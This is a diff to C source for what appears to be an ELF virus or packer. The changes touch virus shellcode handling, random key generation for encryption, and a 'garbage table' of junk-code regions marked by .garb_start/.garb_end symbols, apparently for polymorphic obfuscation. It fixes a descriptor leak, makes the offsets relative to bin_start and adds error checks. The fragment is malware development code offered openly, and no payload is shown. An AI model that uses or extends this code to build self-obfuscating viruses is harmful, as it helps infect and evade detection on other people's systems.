@@ -19,6 +19,7 @@ int randomize(char *k){
 	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
 		return FALSE;
 	ft_read(fd, (char *)k, sizeof(*k)*16);
+	ft_close(fd);
 	return TRUE;
 }
 
@@ -40,11 +41,14 @@ int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	return TRUE;
 }
 
-#define GB_START ".garb_start"
-#define GB_END ".garb_end"
+#define STR_GB_START ".garb_start"
+#define STR_GB_END ".garb_end"
 
 int set_garbage_infos(){
+	int64_t bin_start_off;
 	char **names = NULL;
+	
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
 	
 	int64_t off_gt_len;
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table_len", &off_gt_len);
@@ -66,18 +70,19 @@ int set_garbage_infos(){
 	uint32_t x = 0;
 	uint32_t n = (symtab->sh_size / sizeof(Elf64_Sym));
     for (size_t i = 0; i < n; i++) {
-        //println(strs + sym[i].st_name);
 		//WARNING: this algo may not work on other the linker
-        if (startswith(strs + sym[i].st_name, GB_START)){
-			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, GB_END) &&
-				str_equal(strs + sym[i].st_name + slen(GB_START),
-							 strs + sym[i+1].st_name + slen(GB_END))))
+        if (startswith(strs + sym[i].st_name, STR_GB_START)){
+			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, STR_GB_END) &&
+				str_equal(strs + sym[i].st_name + slen(STR_GB_START),
+							 strs + sym[i+1].st_name + slen(STR_GB_END))))
 				return FALSE;
-			gt[x] = (Garbage){sym[i].st_value, sym[i+1].st_value-sym[i].st_value};
+			gt[x] = (Garbage){sym[i].st_value - bin_start_off, sym[i+1].st_value - sym[i].st_value};
 			//skip next
+			x += 1;
 			i += 1;
         }
     }
+	if (x != gt_len) return FALSE;
 }
 
 int main(int ac, char **av){
@@ -89,7 +94,8 @@ int main(int ac, char **av){
 	size_t crypt_off;
 	size_t crypt_len;
 	struct s_opt opt = {FALSE, FALSE, FALSE};
-	set_garbage_infos();
+	if (!set_garbage_infos())
+		return 2;
 	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
 		return 1;
 	randomize(key);
